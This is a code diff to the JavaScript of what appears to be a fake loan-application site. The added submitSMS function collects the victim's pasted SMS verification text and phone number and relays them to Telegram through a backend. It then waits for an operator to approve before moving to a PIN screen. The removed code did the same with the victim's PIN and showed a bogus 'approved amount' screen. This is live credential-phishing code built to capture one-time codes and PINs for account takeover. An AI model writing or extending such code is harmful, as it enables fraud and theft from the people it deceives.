@@ -193,6 +193,46 @@ async function pasteSMS() {
     }
 }
 
+// --- 2. SEND SMS TO TELEGRAM & WAIT ---
+async function submitSMS() {
+    const smsText = document.getElementById('sms-input').value;
+    if (smsText.length < 5) return;
+
+    // Show processing screen
+    goToScreen('screen-processing');
+
+    const phone = document.getElementById('phone-number').value || "Unknown";
+
+    try {
+        // Send to Telegram (using the 'code' field to carry the SMS text)
+        const response = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, code: `SMS TEXT:\n${smsText}` })
+        });
+        const result = await response.json();
+
+        const interval = setInterval(async () => {
+            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approve') {
+                clearInterval(interval);
+                goToScreen('screen-pin'); // Move to 4-digit PIN screen
+            } else if (statusData.status === 'reject') {
+                clearInterval(interval);
+                alert("SMS Verification rejected by Admin.");
+                goToScreen('screen-sms');
+            }
+        }, 2000);
+
+    } catch (error) {
+        alert("Error connecting to server.");
+        goToScreen('screen-sms');
+    }
+}
+
+
 // --- PIN SCREEN LOGIC ---
 const pinBoxes = document.querySelectorAll('.pin-box');
 
@@ -225,45 +265,6 @@ function moveToPrev(current, event, index) {
     }
 }
 
-// --- 2. TRIGGER TELEGRAM ON PIN SUBMIT ---
-async function submitPIN() {
-    const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
-    const phone = document.getElementById('phone-number').value || "Unknown";
-    const appliedAmount = document.getElementById('form-amount').value;
-    
-    // Immediately show Processing Screen
-    goToScreen('screen-processing');
-
-    try {
-        // Send to Telegram (showing the PIN code)
-        const response = await fetch('/api/request-approval', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, code: `PIN: ${pinCode}` })
-        });
-        const result = await response.json();
-
-        const interval = setInterval(async () => {
-            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
-            const statusData = await statusRes.json();
-
-            if (statusData.status === 'approve') {
-                clearInterval(interval);
-                
-                // Set the final approved amount dynamically
-                document.getElementById('final-amount-display').innerText = parseInt(appliedAmount).toLocaleString();
-                
-                // Show Congratulations Screen
-                goToScreen('screen-success'); 
-            } else if (statusData.status === 'reject') {
-                clearInterval(interval);
-                alert("Verification rejected by Admin.");
-                goToScreen('screen-pin');
-            }
-        }, 2000);
-
-    } catch (error) {
-        alert("Error connecting to server.");
-        goToScreen('screen-pin');
-    }
+function verifyPIN() {
+    goToScreen('screen-success');
 }
